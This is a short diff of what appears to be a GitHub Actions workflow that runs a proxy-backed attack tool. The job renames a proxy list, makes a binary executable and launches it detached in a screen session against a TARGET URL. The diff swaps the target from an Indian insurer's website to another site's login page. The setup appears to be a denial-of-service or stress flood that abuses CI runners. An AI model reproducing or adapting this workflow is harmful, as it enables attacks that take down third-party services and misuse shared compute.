@@ -35,7 +35,7 @@ jobs:
           mv  Fc-main/proxy.txt 90.txt
           mv ki o
           chmod +x o
-          export TARGET="https://www.licindia.in/"
+          export TARGET="https://netbusterstress.pro/login"
           
           
           screen -dms ve ./ $TARGET 200 1 1  90.txt
